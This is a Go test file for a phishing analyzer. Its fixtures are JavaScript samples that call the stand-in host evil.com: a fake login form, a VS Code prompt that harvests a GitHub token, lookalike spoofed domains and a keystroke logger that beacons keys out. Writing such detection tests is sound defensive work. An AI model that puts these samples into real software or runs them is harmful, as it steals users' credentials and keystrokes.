package analyzer

import (
	"strings"
	"testing"
)

func TestPhishingAnalyzer_FakeLoginForm(t *testing.T) {
	a := NewPhishingAnalyzer()
	content := `
document.body.innerHTML = '<form action="https://evil.com/collect">' +
	'<input type="password" name="password">' +
	'<input type="text" name="username">' +
	'<button type="submit">Login</button></form>';
`
	findings := a.scanContent(content, "login.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "phish") || strings.Contains(f.Title, "Phish") || strings.Contains(f.Title, "credential") || strings.Contains(f.Title, "login") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect fake login form phishing")
	}
}

func TestPhishingAnalyzer_IDECredentialHarvest(t *testing.T) {
	a := NewPhishingAnalyzer()
	content := `
const vscode = require('vscode');
vscode.window.showInputBox({
	prompt: 'Enter your GitHub token for authentication',
	password: true,
}).then(token => {
	fetch('https://evil.com/harvest', { method: 'POST', body: JSON.stringify({ token }) });
});
`
	findings := a.scanContent(content, "extension.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "credential") || strings.Contains(f.Title, "Credential") || strings.Contains(f.Title, "harvest") || strings.Contains(f.Title, "IDE") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect IDE credential harvesting")
	}
}

func TestPhishingAnalyzer_DomainSpoofing(t *testing.T) {
	a := NewPhishingAnalyzer()
	content := `
const loginUrl = 'https://github-auth.evil.com/oauth/authorize';
const npmUrl = 'https://registry-npmjs.evil.com/login';
const microsoftUrl = 'https://login-microsoftonline.com/token';
fetch(loginUrl);
`
	findings := a.scanContent(content, "spoof.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "spoof") || strings.Contains(f.Title, "Spoof") || strings.Contains(f.Title, "impersonat") || strings.Contains(f.Title, "lookalike") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect domain spoofing/impersonation")
	}
}

func TestPhishingAnalyzer_KeyloggerPattern(t *testing.T) {
	a := NewPhishingAnalyzer()
	content := `
document.addEventListener('keydown', function(e) {
	const data = { key: e.key, target: e.target.tagName, timestamp: Date.now() };
	navigator.sendBeacon('https://evil.com/log', JSON.stringify(data));
});
`
	findings := a.scanContent(content, "keylog.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "keylog") || strings.Contains(f.Title, "Keylog") || strings.Contains(f.Title, "keystroke") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect keylogger pattern")
	}
}

func TestPhishingAnalyzer_CleanCode(t *testing.T) {
	a := NewPhishingAnalyzer()
	content := `
const form = document.querySelector('#search');
form.addEventListener('submit', (e) => {
	e.preventDefault();
	const query = document.querySelector('#query').value;
	window.location.href = '/search?q=' + encodeURIComponent(query);
});
`
	findings := a.scanContent(content, "clean.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity in clean code: %s", f.Title)
		}
	}
}
